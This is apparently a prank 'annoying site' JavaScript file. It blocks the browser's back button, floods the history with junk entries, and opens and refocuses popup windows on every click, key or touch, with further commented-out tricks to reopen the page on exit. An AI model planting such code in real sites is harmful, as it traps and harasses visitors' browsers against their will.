//document.getElementById('LULZ').requestPointerLock()

function blockBackButton () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

function fillHistory () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  // credits to TheAnnoyingSite
  window.history.pushState({}, '', window.location.pathname)
}

blockBackButton()
fillHistory()
son = []

function openWindow(url){
  aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=220,height=240,titlebar=no,alwaysRaised=yes');
  if (!aWindow) return
  son.push(aWindow)
}

function focusWindows(){
  son.forEach(LOL => {
    if (!LOL.closed) LOL.focus()
  })
}

function interceptUserInput (onInput) {
  document.body.addEventListener('touchstart', onInput, { passive: false })

  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('click', onInput)

  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keyup', onInput)
  document.body.addEventListener('keypress', onInput)
}
interceptUserInput(event => {
  focusWindows()
  openWindow('popup.html')
})
//interceptUserInput(openWindow('popup.html'))
//interceptUserInput(focusWindows())
//wah??? push failure
/*
  focusWindows()
  openWindow('popup.html')
  window.open('https://th.bing.com/th/id/OIP.kg5K90km9f6w5-ytn3iXLwHaEo?rs=1&pid=ImgDetMain','_blank', ''
*/
console.log('i hate those errors')
/* document.getElementById("LULZ").addEventListener('click', e => {
  openWindow('popup.html')
  openWindow('popup.html')
  openWindow('popup.html')
  focusWindows()
  document.getElementById("LULZ").innerHTML = "<H1>:D</H1>"
  document.getElementById("LULZ").click()
  
})

window.onbeforunload = function() {
 window.open(window.location.href, "_blank", "") 
}
*/
